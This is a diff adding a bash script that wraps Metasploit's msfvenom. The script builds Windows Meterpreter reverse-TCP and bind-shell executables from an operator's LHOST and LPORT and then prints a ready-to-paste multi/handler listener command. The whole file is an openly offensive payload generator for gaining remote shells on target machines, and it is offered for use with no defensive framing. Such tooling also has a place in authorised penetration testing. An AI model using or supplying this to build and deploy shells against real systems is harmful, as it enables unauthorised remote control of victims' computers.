@@ -1,0 +1,66 @@
+#!/bin/bash
+
+# This script generates a Metasploit payload based on user selection,
+# saves it to a specified location, and provides the necessary commands
+# to start the listener in msfconsole. The user is also prompted for the
+# LHOST (local host) and LPORT (local port) values for the payload.
+
+# Display the available payload options
+echo "Select the payload:"
+echo "1) Windows 32-bit Reverse TCP"
+echo "2) Windows 64-bit Reverse TCP"
+echo "3) Generic Reverse TCP Shell"
+echo "4) Windows 32-bit Bind Shell"
+echo "5) Windows 64-bit Bind Shell"
+
+# Get the user's choice for the payload
+read -p "Enter the number for the payload: " PAYLOAD_CHOICE
+
+# Map the user's choice to the payload type and shortened filename
+case $PAYLOAD_CHOICE in
+  1)
+    PAYLOAD="windows/meterpreter_reverse_tcp"
+    FILENAME="win32_rev"
+    ;;
+  2)
+    PAYLOAD="windows/x64/meterpreter_reverse_tcp"
+    FILENAME="win64_rev"
+    ;;
+  3)
+    PAYLOAD="generic/shell_reverse_tcp"
+    FILENAME="gen_rev"
+    ;;
+  4)
+    PAYLOAD="windows/shell_bind_tcp"
+    FILENAME="win32_bind"
+    ;;
+  5)
+    PAYLOAD="windows/x64/shell_bind_tcp"
+    FILENAME="win64_bind"
+    ;;
+  *)
+    echo "Invalid choice. Exiting."
+    exit 1
+    ;;
+esac
+
+# Ask the user for the LHOST (local host) and LPORT (local port)
+read -p "Enter the LHOST (local IP address): " LHOST
+read -p "Enter the port number (LPORT): " PORT
+
+# Check if LHOST and PORT are provided
+if [ -z "$LHOST" ] || [ -z "$PORT" ]; then
+  echo "Both LHOST and PORT are required. Exiting."
+  exit 1
+fi
+
+# Generate the payload using msfvenom
+echo "[*] Generating payload: $PAYLOAD"
+msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$PORT -f exe -o /tmp/${FILENAME}_${PORT}.exe
+
+echo "[*] Payload ${FILENAME}_${PORT}.exe created at /tmp/${FILENAME}_${PORT}.exe"
+
+# Display the necessary msfconsole commands in one line for copy-pasting
+echo ""
+echo "[*] To start the listener, paste the following into msfconsole:"
+echo "use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $LHOST; set LPORT $PORT; set ExitOnSession false; exploit -j -z"
